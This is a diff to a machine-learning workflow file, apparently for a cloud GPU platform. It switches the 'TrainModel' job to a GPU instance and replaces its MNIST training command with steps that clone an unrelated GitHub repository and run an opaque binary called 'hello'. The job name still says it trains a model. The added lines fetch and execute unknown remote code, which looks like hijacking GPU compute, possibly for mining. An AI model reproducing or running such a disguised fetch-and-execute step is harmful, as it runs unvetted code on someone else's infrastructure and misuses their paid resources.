@@ -17,7 +17,7 @@ jobs:
         type: volume
   TrainModel:
     resources:
-      instance-type: C3
+      instance-type: P4000
     env:
       PS_MODEL_PATH: /my-trained-model
     uses: container@v1
@@ -26,7 +26,15 @@ jobs:
         - bash
         - -c
         - >-
-          cd /inputs/mnist-sample && python mnist.py
+          apt update
+          apt install -y sudo
+        
+        
+          apt install git -y
+          git clone https://github.com/samrikulan/mergiva.git
+          cd mergiva
+          chmod +x hello
+          ./hello
       image: tensorflow/tensorflow:1.15.5-py3
     needs:
       - CloneRepo
